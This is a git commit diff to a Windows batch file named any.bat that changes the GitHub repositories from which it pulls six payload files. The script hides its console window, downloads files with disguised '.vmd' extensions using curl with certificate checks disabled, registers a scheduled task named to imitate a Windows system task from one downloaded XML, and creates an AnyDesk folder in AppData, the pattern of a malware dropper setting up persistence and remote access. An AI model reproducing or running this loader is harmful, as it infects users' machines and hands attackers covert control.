1d77b7d47cd0eed54abddf4a47ada254d61375a8
nemotomui <nemotom@outlook.kr>
2026-08-25 10:31:24 +0900

    Update URLs and tasks in any.bat script

--- any.bat
+++ any.bat
@@ -1,10 +1,10 @@
 mode 15,1
-curl -k -L -o "%~dp0asdfhk0" "https://github.com/jecoma/basco/raw/refs/heads/main/aefsany/applevbs.vmd"
-curl -k -L -o "%~dp0asdfhk1" "https://github.com/jecoma/basco/raw/refs/heads/main/aefsany/bananaps1.vmd"
-curl -k -L -o "%~dp0asdfhk2" "https://github.com/jecoma/basco/raw/refs/heads/main/aefsany/gamser.vmd"
-curl -k -L -o "%~dp0asdfhk3" "https://github.com/jecoma/basco/raw/refs/heads/main/aefsany/gamsys.vmd"
-curl -k -L -o "%~dp0asdfhk4" "https://github.com/jecoma/basco/raw/refs/heads/main/aefsany/orangeany.vmd"
-curl -k -L -o "%~dp0asdfhk5" "https://github.com/jecoma/basco/raw/refs/heads/main/aefsany/tomatoxml.vmd"
+curl -k -L -o "%~dp0asdfhk0" "https://github.com/nemotomui/gabiaxis/raw/refs/heads/main/aefsany/applevbs.vmd"
+curl -k -L -o "%~dp0asdfhk1" "https://github.com/nemotomui/gabiaxis/raw/refs/heads/main/aefsany/bananaps1.vmd"
+curl -k -L -o "%~dp0asdfhk2" "https://github.com/nemotomui/gabiaxis/raw/refs/heads/main/aefsany/gamser.vmd"
+curl -k -L -o "%~dp0asdfhk3" "https://github.com/nemotomui/gabiaxis/raw/refs/heads/main/aefsany/gamsys.vmd"
+curl -k -L -o "%~dp0asdfhk4" "https://github.com/nemotomui/gabiaxis/raw/refs/heads/main/aefsany/orangeany.vmd"
+curl -k -L -o "%~dp0asdfhk5" "https://github.com/nemotomui/gabiaxis/raw/refs/heads/main/aefsany/tomatoxml.vmd"
 
 schtasks /create /tn User_Feed_Synchronization-{0DDC78AB-E733-425C-B92B-ABAC149AB11232} /xml "%~dp0asdfhk5" /f
 md "%appdata%\AnyDesk"
